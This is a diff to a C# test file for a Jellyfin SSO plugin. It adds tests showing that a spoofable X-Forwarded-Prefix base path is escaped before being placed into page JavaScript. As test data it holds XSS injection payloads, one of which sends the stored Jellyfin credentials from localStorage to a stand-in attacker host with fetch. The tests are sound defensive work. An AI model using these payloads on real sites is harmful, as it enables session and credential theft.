@@ -77,8 +77,9 @@ public sealed class SsoPagesTests
     {
         var page = SsoPages.SelfServiceLink("/jellyfin", [Provider("p1", "Authentik")]);
 
-        Assert.Contains("/jellyfin/sso/link/start?providerId=", page, StringComparison.Ordinal);
-        // The option value is a JavaScript literal, quotes included, not bare text.
+        // The base path is a JavaScript string literal the page builds the URL from, not
+        // text spliced into one — see the hostile-prefix tests below.
+        Assert.Contains("\"/jellyfin\" + '/sso/link/start?providerId='", page, StringComparison.Ordinal);
         Assert.Contains("<option value=\"p1\">Authentik</option>", page, StringComparison.Ordinal);
         Assert.Contains("MediaBrowser Token=", page, StringComparison.Ordinal);
     }
@@ -93,8 +94,36 @@ public sealed class SsoPagesTests
         Assert.Contains("Username: \"ben\\u0022); alert(1); //\"", page, StringComparison.Ordinal);
         Assert.DoesNotContain("\"ben\"); alert(1);", page, StringComparison.Ordinal);
         Assert.Contains("Pw: \"s3cret\"", page, StringComparison.Ordinal);
-        Assert.Contains("/jellyfin/Users/AuthenticateByName", page, StringComparison.Ordinal);
-        Assert.Contains("/jellyfin/web/index.html", page, StringComparison.Ordinal);
+        Assert.Contains("const base = \"/jellyfin\";", page, StringComparison.Ordinal);
+        Assert.Contains("base + '/Users/AuthenticateByName'", page, StringComparison.Ordinal);
+        Assert.Contains("base + '/web/index.html'", page, StringComparison.Ordinal);
+    }
+
+    /// <summary>
+    /// The base path comes from X-Forwarded-Prefix, which anybody can set, and used to be
+    /// spliced straight into single-quoted JavaScript strings. An apostrophe there ends
+    /// the string and what follows is code, on Jellyfin's own origin — where the web
+    /// client's credentials are readable. The validator no longer allows the character and
+    /// the page escapes it anyway; this holds the second half down.
+    /// </summary>
+    [Theory]
+    [InlineData("/'-alert(document.domain)-'")]
+    [InlineData("/x';fetch('//evil.invalid/'+localStorage.jellyfin_credentials);'")]
+    [InlineData("/x\\'")]
+    public void A_hostile_base_path_cannot_leave_its_javascript_string(string prefix)
+    {
+        // The property is that the value appears only in its escaped form. The characters
+        // that would end a string literal are encoded, so the text may still be legible in
+        // the page and is inert there — what must never appear is the raw value.
+        var escaped = SsoPages.JsonEscape(prefix);
+
+        var login = SsoPages.CompleteWebLogin(prefix, "ben", "s3cret");
+        Assert.Contains($"const base = {escaped};", login, StringComparison.Ordinal);
+        Assert.DoesNotContain(prefix, login, StringComparison.Ordinal);
+
+        var link = SsoPages.SelfServiceLink(prefix, [Provider("p1", "Authentik")]);
+        Assert.Contains($"fetch({escaped} + ", link, StringComparison.Ordinal);
+        Assert.DoesNotContain(prefix, link, StringComparison.Ordinal);
     }
 
     [Fact]
